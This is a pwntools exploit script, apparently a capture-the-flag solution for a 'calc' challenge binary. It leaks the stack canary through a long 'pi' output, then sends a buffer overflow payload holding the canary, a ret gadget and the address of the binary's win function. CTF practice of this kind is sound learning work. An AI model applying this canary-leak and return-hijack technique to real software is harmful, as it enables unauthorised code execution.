from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf = ELF("calc")

gdbscript = """
init-gef
continue
"""
#p = gdb.debug(elf.path, gdbscript=gdbscript)
p = process()
#p = remote("challs.pwnoh.io", 13377)

# Leak puts
rop = ROP(elf)
#RET = rop.find_gadget(['ret'])[0]

def modify_hex_and_convert(hex_value):
    int_value = int(hex_value, 16)
    modified_int_value = int_value & ~0xFF  # This sets the last byte to 0x00    
    return modified_int_value

p.sendline("pi")
p.sendline("11420")
p.recvuntil("8815920560010165525637568")
#Remote
#p.recvuntil(b"\x7f" + b"\x00"*27)
#local
p.recvuntil(b"\x20" + b"\x00"*32)
canary = u64(p.recv(8).strip().ljust(8, b'\x00'))
canary = modify_hex_and_convert(hex(canary))
log.info(f"canary found = {hex(canary)}")
payload = flat(
    cyclic(40),
    p64(canary),
    p64(rop.ret.address),
    elf.sym['win']+5
)
p.sendline("*")
p.sendline("0")

p.sendline(payload)
p.interactive()
